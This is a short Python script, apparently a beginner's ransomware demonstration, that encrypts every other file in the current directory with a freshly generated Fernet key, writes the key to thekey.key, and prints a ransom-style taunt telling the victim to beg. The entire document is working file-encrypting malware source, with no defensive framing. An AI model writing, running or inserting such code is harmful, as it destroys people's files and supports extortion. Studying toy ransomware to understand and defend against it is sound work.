#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []                              #create our list

for file in os.listdir():               #list file in .
    if file == "oops.py" or file == "thekey.key" or file == "decrypt.py":         # do not list this file
        continue
    if os.path.isfile(file):            #onlu files
        files.append(file)              # append them to the list
print(files)


key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:

    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)

print("ALL your files have been encrypted! beg me to save you :)")
